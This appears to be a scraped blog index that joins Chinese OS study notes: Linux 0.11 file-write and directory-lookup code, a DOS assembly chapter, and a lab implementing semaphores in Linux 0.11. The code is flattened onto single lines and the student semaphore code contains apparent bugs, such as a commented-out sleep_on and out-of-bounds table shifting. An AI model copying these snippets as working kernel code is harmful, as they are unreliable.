既然对文件操作就要调用sys_write(),参数：fd文件描述符，buf内存缓冲区，count读写字符的个数 根据文件信息 inode 对应的不是字符设备，而是常规文件，跳到 file_write() 去执行\nfile_write()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 int file_write(struct m_inode *inode, struct file *filp, char *buf, int count) { off_t pos; if(filp-\u0026gt;f_flags\u0026amp;O_APPEND)//如果是追加，从文末开始 pos=inode-\u0026gt;i_size; else pos=filp-\u0026gt;f_pos; ..... while(i\u0026lt;count) { block=create_block(inode, pos/BLOCK_SIZE);//算出对应的块 bh=bread(inode-\u0026gt;i_dev, block);//发送请求，放入“电梯” 队列! int c=pos%BLOCK_SIZE; char *p=c+bh-\u0026gt;b_data; //写入数据后，修改修改pos， bh-\u0026gt;b_dirt=1; c=BLOCK_SIZE-c; pos+=c; // pos指向文件的读写位置(字符流末位置) ... //一块一块拷贝用户字符， 并且释放写出 while(c--\u0026gt;0) *(p++)=get_fs_byte(buf++); brelse(bh); } filp-\u0026gt;f_pos=pos; } //pos 先找到 文件的读写位置 （记录在 字段 f_pos 中） //block 计算物理盘块号 //bread 向磁盘发出请求 工作过程：\n1.根据file中的一个==读写指针fseek（文件的当前读写位置）及 count 找到文件读写对应的字符流位置==\n2.根据字符流上的读写位置算出逻辑块号 ,==由inode 找到物理盘块号==\n3.==用磁盘号，buf等形成request放入请求队列(“电梯”)==，就可以读写磁盘\n==create_block()计算盘号，文件抽象的核心==\n这里采用的多级索引 block:(0-6):直接数据块（直接索引）， (7):一重间接， (8):二重间接\n如果逻辑盘块号小于等于 6，说明 inode中的直接数据块就能映射出盘块号 若这个逻辑盘块没有映射到物理盘块，就调用 new_block() 从磁盘上申请一个空闲物理盘块\nblock-=7 ， if(block\u0026lt;512) 说明逻辑盘块号对应的物理盘块号存放在一阶间接索引，接下来需要 bread(inode-\u0026gt;i_dev,inode-\u0026gt;i_zone[7]) 读入这个一阶索引块，接下来需要在这个索引块中寻找和逻辑块相对应的物理盘块号\nm_inode结构体\n1 2 3 4 5 6 7 8 9 10 struct m_inode{ //读入内存后的inode unsigned short i_mode; //文件的类型和属性 ... unsigned short i_zone[9]; //指向文件内容数据块 struct task_struct *i_wait; unsigned short i_count; unsigned char i_lock; unsigned char i_dirt; ... } 根据inode区分文件的属性和类型\n1 2 3 4 5 6 7 8 9 int sys_open(const char* filename, int flag) { if(S_ISCHR(inode-\u0026gt;i_mode)) //字符设备 { if(MAJOR(inode-\u0026gt;i_zone[0])==4) //设备文件 current-\u0026gt;tty=MINOR(inode-\u0026gt;i_zone[0]); } ... } ==如果是普通文件需要根据inode里面的映射表来建立磁盘号到字符流直接的映射==\n==如果是特殊文件不需要inode去完成映射，inode存放主设备号(设备文件)==\nMAJOR的宏定义\n1 2 #define MAJOR(a)(((unsigned)(a))\u0026gt;\u0026gt;8)) //取高字节 #define MINOR(a)((a)\u0026amp;0xff) //取低字节 总结 ==文件视图== 目录与文件系统 前言 文件， 抽象一个磁盘块集合，这是第三层抽象，从文件到文件系统：文件系统， 抽象整个磁盘（第四层抽象）\n一、文件系统 在使用磁盘的时候，用户眼里的磁盘是一堆树结构的有组织的文件，文件系统就是实现文件到盘块的映射\n目录树的优点： 但是有了这样的映射，怎么才能使用 /my/data/a中a文件(\u0026quot;/\u0026quot; 表示根目录)?\n==通过文件路径名找到文件 ，也就是先通过文件路径找到文件a的FCB==\n因为需要通过比较文件名才能找到文件，所以目录中需要存放子目录的文件名，又还需要在磁盘中操作该文件，因此还需要存子目录的FCB。\n但实际上我们只需要比较一个文件名，却读入了大量的FCB，系统效率笔记低，因此可以在目录中存放子目录名+该目录对应的FCB地址。目录里存的就是\u0026lt;文件名：索引值\u0026gt;，实现这一索引结构，需要磁盘配合，==需要磁盘划分一块连续的区域来存放FCB块，这样就能建立索引值到FCB地址的映射==\n因为根目录没有上一级目录来保存它的索引值，因此需要在磁盘中找一个固定的地址存放根目录\n所以操作系统需要完成以下两个任务：\n1.目录中存放子目录的文件名和子目录FCB的索引值 2.磁盘块要划分一段连续的区域专门存放FCB块，并定义一个初始地址作为根目录的索引\n磁盘块如下：\n(1)inode位图：哪些inode空闲，哪些被占用 (2)盘块位图：哪些盘块是空闲的，硬盘大小不同这个图的大小也不同 (3)引导块：磁盘启动和初始化 (4)超级块：记录两个位图有多大等信息\n空闲位图(位向量)：0011110011101 表示：表示磁盘块2、 3、 4、 5、8、 9、 10、 12空闲\n==完成全部映射下的磁盘使用过程== 二、文件系统代码实现 只要把文件系统如何映像到磁盘上对应扇区再加上前面学过的知识不就是文件系统的实现吗?\n目录解析：\n在open()函数里面找到对应文件并打开，而open()调用了sys_open()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 在linux/fs/open.c中 int sys_open(const char* filename, int flag) { i=open_namei(filename,flag,\u0026amp;inode); //解析路径 ... } int open_namei(...) { dir=dir_namei(pathname,\u0026amp;namelen,\u0026amp;basename); .... } static struct m_inode *dir_namei() { dir=get_dir(pathname); } ==经过一系列的调用真正完成目录解析的是get_dir==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 static struct m_inode *get_dir(const char *pathname) { if((c=get_fs_byte(pathname))==‘/’) //根目录 { inode=current-\u0026gt;root; pathname++; } else if(c) inode=current-\u0026gt;pwd; //解析从此处开始 while(1) { if(!c) return inode; //函数的正确出口 bh=find_entry(\u0026amp;inode,thisname,namelen,\u0026amp;de); int inr=de-\u0026gt;inode; int idev=inode-\u0026gt;i_dev; inode=iget(idev,inr); //根据目录项读取下一层inode } } (1)root： 找到根目录； (2)find_entry： 从目录中读取目录项； (3)inr： 是目录项中的索引节点号； (4)iget： 再读下一层目录\n目录解析首先要找到一个解析的起点，如果路径名从 / 开始，就从根目录的inode 开始，否则要从当前目录的 inode 开始\n==根目录inode的解析==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 inode=current-\u0026gt;root; void init(void) { setup((void *) \u0026amp;drive_info); ... } sys_setup(void * BIOS)//在kernel/hd.c中 { hd_info[drive].head = *(2+BIOS); hd_info[drive].sect = *(14+BIOS); mount_root(); ... } void mount_root(void)//在fs/super.c中 { mi=iget(ROOT_DEV,ROOT_INO)); current-\u0026gt;root = mi; ... } 所有进程的 root 都是从 1 号进程继承来的，在 1 号进程 init() 函数中要执行 mount_root()函数，用来将根目录的 inode读入到内存中，并且关联到 1 号进程的 PCB 中\n有了起点目录文件的 inode，接下来读出目录文件内容，然后用文件路径上的文件名和和目录中的目录项逐个比对，不断向下解析，直到路径名被全部处理完成, 最终找到目标文件的inode\n==读取inode （iget()函数）==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 struct m_inode * iget(int dev, int nr) { struct m_inode * inode = get_empty_inode(); inode-\u0026gt;i_dev=dev; inode-\u0026gt;i_num=nr; read_inode(inode); return inode; } static void read_inode(struct m_inode *inode) { struct super_block *sb=get_super(inode-\u0026gt;i_dev);; lock_inode(inode); block=2+sb-\u0026gt;s_imap_blocks+sb-\u0026gt;s_zmap_blocks+ (inode-\u0026gt;i_num-1)/INODES_PER_BLOCK; bh=bread(inode-\u0026gt;i_dev,block); inode=bh-\u0026gt;data[(inode-\u0026gt;i_num-1)%INODES_PER_BLOCK]; unlock_inode(inode); } 以上都是根据磁盘的划分来实现的 从上图可以看到inode 数组的起始位置在引导块,超级块以及两个位图数组之后\ninode 数组在磁盘上的起始位置 = 引导块大小 + 超级块大小 + s_imap_blocks大小 + s_zmap_blocks大小\n==开始解析目录 find_entry()==\n函数 find_entry 根据目录文件的 inode 读取目录项数组，然后逐个目录项进行匹配，即 while(i\u0026lt;entries) if(match(namelen,name,de))\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 在fs/namei.c中 static struct buffer_head *find_entry(struct m_inode **dir, char *name, ..., struct dir_entry ** res_dir) { int entries=(*dir)-\u0026gt;i_size/(sizeof(struct dir_entry)); int block=(*dir)-\u0026gt;i_zone[0]; *bh=bread((*dir)-\u0026gt;i_dev, block); struct dir_entry *de =bh-\u0026gt;b_data; while(i\u0026lt;entries) //entries是目录项数 { //#define BLOCK_SIZE 1024 两个扇区 if((char*)de\u0026gt; = BLOCK_SIZE+bh-\u0026gt;b_data) { brelse(bh); block=bmap(*dir,i/DIR_ENTRIES_PER_BLOCK); bh=bread((*dir)-\u0026gt;i_dev,block); de=(struct dir_entry*)bh-\u0026gt;b_data; } //读入下一块上的目录项继续match if(match(namelen,name,de)) { *res_dir=de;return bh; } de++; i++; } } de: directory entry(目录项)\n1 2 3 4 5 6 7 #define NAME_LEN 14 struct dir_entry { unsigned short inode; //i节点号 char name[NAME_LEN]; //文件名 } iget 用来读取索引节点，根据 inode 编号（iget 的参数）和 inode 数组的初始位置计算出该 inode 所在的磁盘块号，再用 bread 发送请求，放入“电梯” 队列，就可以完成磁盘的读写。\n","permalink":"https://chance7bin.github.io/posts/basic/os/%E4%BA%94%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/","summary":"磁盘的管理(一) 前言 磁盘既是输入设备又是输出设备。 输出设备（OutputDevice）是人与计算机交互的一种部件，用于数据的输出。 输入设备：","title":"五、存储管理"},{"content":"4.1 一个源程序从写出到执行的过程 4.2 源程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 assume cs: codesg codesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax ,4c00H int 21H codesg ends end 伪指令 在汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。而伪指令没有对应的机器指令，最终不被CPU所执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n程序中出现了3种伪指令\n（1）segment和ends\nsegment和ends是一对成对使用的伪指令，这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指\nsegment和ends的功能是定义一个段segment说明一个段开始，ends说明一个段结束。一个段必须有一个名称来标识\n（2）end\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。所以，在我们写程序的时候，如果程序写完了，要在结尾处加上伪指令end。否则，编译器在编译程序时，无法知道程序在何处结束。\n（3) assume\n这条伪指令的含义为“假设”。它假设某一段寄存器和程序中的某一个用segment\u0026hellip;ends定义的段相关联。通过 assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n比如，在程序中，用codesg segment \u0026hellip; codesg ends定义了一个名为codseg的段，在这个段中存放代码，所以这个段是一个代码段。在程序的开头，用assume cs:codesg 将用作代码段的段codesg和CPU中的段寄存器cs联系起来。\n注意，以后可以将源程序文件中的所有内容称为源程序，将源程序中最终由计算机执行、处理的指令或数据，称为程序。\n程序返回 一个程序P2在可执行文件中，则必须有一个正在运行的程序P1，将P2从可执行文件中加载入内存后，将CPU的控制权交给P2，P2才能得以运行。P2开始运行后，P1暂停运行。而当P2运行完毕后，应该将CPU的控制权交还给使它得以运行的程序P1，此后，P1继续运行。\n现在，我们知道，一个程序结束后，将 CPU的控制权交还给使它得以运行的程序，我们称这个过程为：程序返回。那么，如何返回呢？应该在程序的末尾添加返回的程序段。\n我们回过头来，看一下程序中的两条指令：\n1 2 mov ax ,4c00H int 21H 这两条指令所实现的功能就是程序返回。\nDOS 源程序的编辑、编译、连接、执行 编辑 1 C:\\\u0026gt;edit 编译 masm\n1 C:\\masm\u0026gt;masm c:\\1; 在后面加分号自动忽略中间文件的生成\n连接 link\n1 C:\\masm\u0026gt;link 1; 执行 1 C:\\masm\u0026gt;1 4.8 谁将可执行文件中的程序装载进入内存并使它运行？ （1）在 DOS中直接执行1.exe时，是正在运行的command，将1.exe中的程序加载入内存;\n（2）command设置CPU 的CS:IP指向程序的第一条指令(即程序的入口)，从而使程序得以运行;\n（3）程序运行结束后，返回到command 中，CPU继续运行command。\n4.9 程序执行过程的跟踪 为了观察程序的运行过程，可以使用Debug。Debug 可以将程序加载入内存，设置CS:IP指向程序的入口，但 Debug 并不放弃对CPU的控制，这样，我们就可以使用Debug的相关命令来单步执行程序，查看每一条指令的执行结果。\n在 DOS系统中.EXE文件中的程序的加载过程 （1）程序加载后，ds中存放着程序所在内存区的段地址，这个内存区的偏移地址为0，则程序所在的内存区的地址为ds:0；\n（2）这个内存区的前256个字节中存放的是PSP，DOS用来和程序进行通信。从256字节处向后的空间存放的是程序。\n所以，从ds中可以得到PSP的段地址SA，PSP的偏移地址为0，则物理地址为SA×16+0。\n因为PSP占256(100H)字节，所以程序的物理地址是：SA×16+0+256=SA×16+16×16+0=(SA+16)×16+0\n可用段地址和偏移地址表示为：SA+10H:0。\n图4.19中DS 的值，DS=129E，则PSP的地址为129E:0，程序的地址为12AE:0(即129E+10:0)。\n==到了int 21，要用P命令执行==\nint 21执行后，显示出“Program terminated normally”，返回到 Debug中。表示程序正常结束。\n使用Q命令退出Debug，将返回到command 中，因为 Debug是由command加载运行的。在 DOS中用“debug 1.exe”运行Debug对1.exe进行跟踪时，程序加载的顺序是：command加载Debug，Debug加载1.exe。返回的顺序是：从 1.exe 中的程序返回到Debug，从Debug返回到command。\n==实验== 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 assume cs:codesg codesg segment mov ax,2000H mov ss,ax mov sp,0 add sp,10 pop ax pop bx push ax push bx pop ax pop bx mov ax,4c00H int 21H codesg ends end 2000:0 - 2000:f 这一行\n在执行pop时，红框内容右移\n在执行push时，红框内容左移 ==为什么？==\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC4%E7%AB%A0-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/","summary":"4.1 一个源程序从写出到执行的过程 4.2 源程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 assume cs: codesg codesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax ,4c00H int 21H codesg ends end 伪指令 在汇编语言源程序中，包含两","title":"第4章 第一个程序"},{"content":"1.实验目的 加深对进程同步与互斥概念的认识； 掌握信号量的使用，并应用它解决生产者——消费者问题； 掌握信号量的实现原理。 2.实验内容 本次实验的基本内容是：\n在 Ubuntu 下编写程序，用信号量解决生产者——消费者问题； 在 0.11 中实现信号量，用生产者—消费者程序检验之。 3.1 用信号量解决生产者—消费者问题 在 Ubuntu 上编写应用程序“pc.c”，解决经典的生产者—消费者问题，完成下面的功能：\n建立一个生产者进程，N 个消费者进程（N\u0026gt;1）； 用文件建立一个共享缓冲区； 生产者进程依次向缓冲区写入整数 0,1,2,\u0026hellip;,M，M\u0026gt;=500； 消费者进程从缓冲区读数，每次读一个，并将读出的数字从缓冲区删除，然后将本进程 ID 和 + 数字输出到标准输出； 缓冲区同时最多只能保存 10 个数。 一种可能的输出效果是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 10: 0 10: 1 10: 2 10: 3 10: 4 11: 5 11: 6 12: 7 10: 8 12: 9 12: 10 12: 11 12: 12 …… 11: 498 11: 499 其中 ID 的顺序会有较大变化，但冒号后的数字一定是从 0 开始递增加一的。\npc.c 中将会用到 sem_open()、sem_close()、sem_wait() 和 sem_post() 等信号量相关的系统调用，请查阅相关文档。\n《UNIX 环境高级编程》是一本关于 Unix/Linux 系统级编程的相当经典的教程。如果你对 POSIX 编程感兴趣，建议买一本常备手边。\n哈尔滨工业大学校园网用户可以在 ftp://run.hit.edu.cn/study/Computer_Science/Linux_Unix/ 下载，后续实验也用得到。\n3.2 实现信号量 Linux 在 0.11 版还没有实现信号量，Linus 把这件富有挑战的工作留给了你。如果能实现一套山寨版的完全符合 POSIX 规范的信号量，无疑是很有成就感的。但时间暂时不允许我们这么做，所以先弄一套缩水版的类 POSIX 信号量，它的函数原型和标准并不完全相同，而且只包含如下系统调用：\n1 2 3 4 sem_t *sem_open(const char *name, unsigned int value); int sem_wait(sem_t *sem); int sem_post(sem_t *sem); int sem_unlink(const char *name); sem_open()的功能是创建一个信号量，或打开一个已经存在的信号量。\nsem_t 是信号量类型，根据实现的需要自定义。 name 是信号量的名字。不同的进程可以通过提供同样的 name 而共享同一个信号量。如果该信号量不存在，就创建新的名为 name 的信号量；如果存在，就打开已经存在的名为 name 的信号量。 value 是信号量的初值，仅当新建信号量时，此参数才有效，其余情况下它被忽略。当成功时，返回值是该信号量的唯一标识（比如，在内核的地址、ID 等），由另两个系统调用使用。如失败，返回值是 NULL。 sem_wait() 就是信号量的 P 原子操作。如果继续运行的条件不满足，则令调用进程等待在信号量 sem 上。返回 0 表示成功，返回 -1 表示失败。\nsem_post() 就是信号量的 V 原子操作。如果有等待 sem 的进程，它会唤醒其中的一个。返回 0 表示成功，返回 -1 表示失败。\nsem_unlink() 的功能是删除名为 name 的信号量。返回 0 表示成功，返回 -1 表示失败。\n在 kernel 目录下新建 sem.c 文件实现如上功能。然后将 pc.c 从 Ubuntu 移植到 0.11 下，测试自己实现的信号量。\n3.实验报告 完成实验后，在实验报告中回答如下问题：\n在 pc.c 中去掉所有与信号量有关的代码，再运行程序，执行效果有变化吗？为什么会这样？ 实验的设计者在第一次编写生产者——消费者程序的时候，是这么做的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Producer() { // 生产一个产品 item; // 空闲缓存资源 P(Empty); // 互斥信号量 P(Mutex); // 将item放到空闲缓存中; V(Mutex); // 产品资源 V(Full); } Consumer() { P(Full); P(Mutex); //从缓存区取出一个赋值给item; V(Mutex); // 消费产品item; V(Empty); } 这样可行吗？如果可行，那么它和标准解法在执行效果上会有什么不同？如果不可行，那么它有什么问题使它不可行？\n4.实验提示 本实验需要完成两个任务：（1）在 Ubuntu 下编写程序，用信号量解决生产者——消费者问题；（2）在 linux-0.11 中实现信号量，用生产者—消费者程序检验之。\n4.1信号量 信号量，英文为 semaphore，最早由荷兰科学家、图灵奖获得者 E. W. Dijkstra 设计，任何操作系统教科书的“进程同步”部分都会有详细叙述。\nLinux 的信号量秉承 POSIX 规范，用man sem_overview可以查看相关信息。\n本次实验涉及到的信号量系统调用包括：sem_open()、sem_wait()、sem_post() 和 sem_unlink()。\n生产者—消费者问题\n生产者—消费者问题的解法几乎在所有操作系统教科书上都有，其基本结构为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Producer() { // 生产一个产品 item; // 空闲缓存资源 P(Empty); // 互斥信号量 P(Mutex); // 将item放到空闲缓存中; V(Mutex); // 产品资源 V(Full); } Consumer() { P(Full); P(Mutex); //从缓存区取出一个赋值给item; V(Mutex); // 消费产品item; V(Empty); } 显然在演示这一过程时需要创建两类进程，一类执行函数 Producer()，另一类执行函数 Consumer()。\n4.2多进程共享文件 在 Linux 下使用 C 语言，可以通过三种方法进行文件的读写：\n使用标准 C 的 fopen()、fread()、fwrite()、fseek() 和 fclose() 等； 使用系统调用 open()、read()、write()、lseek() 和 close() 等； 通过内存镜像文件，使用 mmap() 系统调用。 在 Linux 0.11 上只能使用前两种方法。 fork() 调用成功后，子进程会继承父进程拥有的大多数资源，包括父进程打开的文件。所以子进程可以直接使用父进程创建的文件指针/描述符/句柄，访问的是与父进程相同的文件。\n使用标准 C 的文件操作函数要注意，它们使用的是进程空间内的文件缓冲区，父进程和子进程之间不共享这个缓冲区。因此，任何一个进程做完写操作后，必须 fflush() 一下，将数据强制更新到磁盘，其它进程才能读到所需数据。\n建议直接使用系统调用进行文件操作。\n4.3终端也是临界资源 用 printf() 向终端输出信息是很自然的事情，但当多个进程同时输出时，终端也成为了一个临界资源，需要做好互斥保护，否则输出的信息可能错乱。\n另外，printf() 之后，信息只是保存在输出缓冲区内，还没有真正送到终端上，这也可能造成输出信息时序不一致。用 fflush(stdout) 可以确保数据送到终端。\n4.4原子操作、睡眠和唤醒 Linux 0.11 是一个支持并发的现代操作系统，虽然它还没有面向应用实现任何锁或者信号量，但它内部一定使用了锁机制，即在多个进程访问共享的内核数据时一定需要通过锁来实现互斥和同步。\n锁必然是一种原子操作。通过模仿 0.11 的锁，就可以实现信号量。\n多个进程对磁盘的并发访问是一个需要锁的地方。Linux 0.11 访问磁盘的基本处理办法是在内存中划出一段磁盘缓存，用来加快对磁盘的访问。进程提出的磁盘访问请求首先要到磁盘缓存中去找，如果找到直接返回；如果没有找到则申请一段空闲的磁盘缓存，以这段磁盘缓存为参数发起磁盘读写请求。请求发出后，进程要睡眠等待（因为磁盘读写很慢，应该让出 CPU 让其他进程执行）。这种方法是许多操作系统（包括现代 Linux、UNIX 等）采用的较通用的方法。这里涉及到多个进程共同操作磁盘缓存，而进程在操作过程可能会被调度而失去 CPU。因此操作磁盘缓存时需要考虑互斥问题，所以其中必定用到了锁。而且也一定用到了让进程睡眠和唤醒。\n下面是从 kernel/blk_drv/ll_rw_blk.c 文件中取出的两个函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 static inline void lock_buffer(struct buffer_head * bh) { // 关中断 cli(); // 将当前进程睡眠在 bh-\u0026gt;b_wait while (bh-\u0026gt;b_lock) sleep_on(\u0026amp;bh-\u0026gt;b_wait); bh-\u0026gt;b_lock=1; // 开中断 sti(); } static inline void unlock_buffer(struct buffer_head * bh) { if (!bh-\u0026gt;b_lock) printk(\u0026#34;ll_rw_block.c: buffer not locked\\n\\r\u0026#34;); bh-\u0026gt;b_lock = 0; // 唤醒睡眠在 bh-\u0026gt;b_wait 上的进程 wake_up(\u0026amp;bh-\u0026gt;b_wait); } 分析 lock_buffer() 可以看出，访问锁变量时用开、关中断来实现原子操作，阻止进程切换的发生。当然这种方法有缺点，且不适合用于多处理器环境中，但对于 Linux 0.11，它是一种简单、直接而有效的机制。\n另外，上面的函数表明 Linux 0.11 提供了这样的接口：用 sleep_on() 实现进程的睡眠，用 wake_up() 实现进程的唤醒。它们的参数都是一个结构体指针—— struct task_struct *，即进程都睡眠或唤醒在该参数指向的一个进程 PCB 结构链表上。\n因此，我们可以用开关中断的方式实现原子操作，而调用 sleep_on() 和 wake_up() 进行进程的睡眠和唤醒。\nsleep_on() 的功能是将当前进程睡眠在参数指定的链表上（注意，这个链表是一个隐式链表，详见《注释》一书）。wake_up() 的功能是唤醒链表上睡眠的所有进程。这些进程都会被调度运行，所以它们被唤醒后，还要重新判断一下是否可以继续运行。可参考 lock_buffer() 中的那个 while 循环。\n4.5应对混乱的 bochs 虚拟屏幕 不知是 Linux 0.11 还是 bochs 的 bug，如果向终端输出的信息较多，bochs 的虚拟屏幕会产生混乱。此时按 ctrl+L 可以重新初始化一下屏幕，但输出信息一多，还是会混乱。建议把输出信息重定向到一个文件，然后用 vi、more 等工具按屏查看这个文件，可以基本解决此问题。\n4.6关于 string.h 的提示 下面描述的问题未必具有普遍意义，仅做为提醒，请实验者注意。\ninclude/string.h 实现了全套的 C 语言字符串操作，而且都是采用汇编 + inline 方式优化。\n但在使用中，某些情况下可能会遇到一些奇怪的问题。比如某人就遇到 strcmp() 会破坏参数内容的问题。如果调试中遇到有些 “诡异” 的情况，可以试试不包含头文件，一般都能解决。不包含 string.h，就不会用 inline 方式调用这些函数，它们工作起来就趋于正常了。\n5.实验步骤 实验内容 本次实验的基本内容是在Linux 0.11的内核中实现信号量，并向用户提供使用信号量的接口，用户使用该接口解决一个实际的进程同步问题。实验的主要内容包括如下两个部分：\n1.实现信号量 在Linux 0.11内核上（Linux 0.11内核中没有定义信号量）实现信号量，并创建相应的系统调用以供用户使用。应提供的系统接口主要包括：\n1 int CreateSemaphore(char * semname); 该操作用来在内核中创建一个信号量，输入的参数是信号量的名字，返回的是信号量的一个整数标识semid，信号量是一种内核资源，不应该无限制的创建，所以在内核中信号量可以被组织成一个数组，此时semid就是创建的信号量在内核信号量数组中的下标。如果这个名为semname的信号量已经创建，则返回这个已创建的信号量的标识semid，也即多个具有相同名字的信号量创建接口返回相同的返回值，即相同的semid\n1 int SetSemaphore(int semid, int value); 用来设置信号量的值，其中semid是信号量标识，value是要设置的信号量值，该函数的返回值是信号量的当前值。该接口通常用来设置信号量的初值。\n1 int WaitSemaphore(int semid); 该函数就是信号量的P操作，其功能就是对信号量的值减1，如果其值小于0则令调用进程等待在信号量semid上。\n1 int SignalSemaphore(int semid); 该函数就是信号量的V操作，其功能就是对信号量的值加1，如果其值小于等于0则令唤醒等待在信号量semid上的进程。\n2.使用信号量 在定义了信号量的Linux 0.11操作系统上编写用户程序来演示信号量的作用。该用户程序解决就是传统的生产者—消费者问题，要求编写的用户程序完成下面的任务： 1.编写的主程序演示生产者—消费者两个进程的同步过程； 2.编写的主程序创建两个进程：生产者进程和消费者进程； 3.编写生产者进程和消费者进程的代码。 4.要求对比三种设置下的运行结果：\n没有信号量下的生产者—消费者。 有信号量，1个生产者进程，1个消费者进程，用for循环控制生产者（消费者）各执行N次。 有信号量，N个生产者进程，N个消费者进程。 步骤 一、实现信号量 1.新建sem.h 在linux-0.11/include/linux目录下新建sem.h，定义信号量的数据结构。sem.h的代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #ifndef _SEM_H #define _SEM_H #include \u0026lt;linux/sched.h\u0026gt; #define SEMTABLE_LEN 20 #define SEM_NAME_LEN 20 typedef struct semaphore{ char name[SEM_NAME_LEN]; int value; struct task_struct *queue; } sem_t; extern sem_t semtable[SEMTABLE_LEN]; #endif 代码截图如下：\n2.新建sem.c 在linux-0.11/kernel目录下，新建实现信号量函数的源代码文件sem.c。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 #include \u0026lt;linux/sem.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;asm/segment.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fdreg.h\u0026gt; #include \u0026lt;asm/system.h\u0026gt; #include \u0026lt;asm/io.h\u0026gt; //#include \u0026lt;string.h\u0026gt; sem_t semtable[SEMTABLE_LEN]; int cnt = 0; sem_t *sys_sem_open(const char *name,unsigned int value) { char kernelname[100]; int isExist = 0; int i=0; int name_cnt=0; while( get_fs_byte(name+name_cnt) != \u0026#39;\\0\u0026#39;) name_cnt++; if(name_cnt\u0026gt;SEM_NAME_LEN) return NULL; for(i=0;i\u0026lt;name_cnt;i++) kernelname[i]=get_fs_byte(name+i); int name_len = strlen(kernelname); int sem_name_len =0; sem_t *p=NULL; for(i=0;i\u0026lt;cnt;i++) { sem_name_len = strlen(semtable[i].name); if(sem_name_len == name_len) { if( !strcmp(kernelname,semtable[i].name) ) { isExist = 1; break; } } } if(isExist == 1) { p=(sem_t*)(\u0026amp;semtable[i]); //printk(\u0026#34;find previous name!\\n\u0026#34;); } else { i=0; for(i=0;i\u0026lt;name_len;i++) { semtable[cnt].name[i]=kernelname[i]; } semtable[cnt].value = value; p=(sem_t*)(\u0026amp;semtable[cnt]); //printk(\u0026#34;creat name!\\n\u0026#34;); cnt++; } return p; } int sys_sem_wait(sem_t *sem) { cli(); while( sem-\u0026gt;value \u0026lt;= 0 ) // sleep_on(\u0026amp;(sem-\u0026gt;queue)); //这两条语句顺序不能颠倒，很重要，是关于互斥信号量能不能正确工作的！！！ sem-\u0026gt;value--; sti(); return 0; } int sys_sem_post(sem_t *sem) { cli(); sem-\u0026gt;value++; if( (sem-\u0026gt;value) \u0026lt;= 1) wake_up(\u0026amp;(sem-\u0026gt;queue)); sti(); return 0; } int sys_sem_unlink(const char *name) { char kernelname[100]; /* 应该足够大了 */ int isExist = 0; int i=0; int name_cnt=0; while( get_fs_byte(name+name_cnt) != \u0026#39;\\0\u0026#39;) name_cnt++; if(name_cnt\u0026gt;SEM_NAME_LEN) return NULL; for(i=0;i\u0026lt;name_cnt;i++) kernelname[i]=get_fs_byte(name+i); int name_len = strlen(name); int sem_name_len =0; for(i=0;i\u0026lt;cnt;i++) { sem_name_len = strlen(semtable[i].name); if(sem_name_len == name_len) { if( !strcmp(kernelname,semtable[i].name)) { isExist = 1; break; } } } if(isExist == 1) { int tmp=0; for(tmp=i;tmp\u0026lt;=cnt;tmp++) { semtable[tmp]=semtable[tmp+1]; } cnt = cnt-1; return 0; } else return -1; } 3.修改unistd.h 在unistd.h内增加新的系统调用编号(之前的实验中也有做系统调用，所以这里直接记录一下修改的结果，过程就大概省略了一些)\n1 2 3 4 #define __NR_sem_open 72 #define __NR_sem_wait 73 #define __NR_sem_post 74 #define __NR_sem_unlink 75 4.修改system_call.s 在system_call.s文件中找到nr_system_calls并将其值更改为76（因为增加了四个sem系统调用函数）\n1 nr_system_calls = 76 5.修改sys.h 增加四个函数，函数如下： 1 2 3 4 extern int sys_sem_open(); extern int sys_sem_wait(); extern int sys_sem_post(); extern int sys_sem_unlink(); 将函数名放在数组内： 1 sys_sem_open,sys_sem_wait,sys_sem_post,sys_sem_unlink 代码截图如下:\n6.修改Makefile 将kernel下的Makefile修改为如下代码块（部分）：\n1 2 3 4 5 6 7 8 9 10 11 ...... OBJS = sched.o system_call.o traps.o asm.o fork.o \\ panic.o printk.o vsprintf.o sys.o exit.o \\ signal.o mktime.o sem.o ...... ### ###Dependencies: sem.s sem.o: sem.c ../include/linux/sem.h ../include/linux/kernel.h \\ ../include/unistd.h ...... 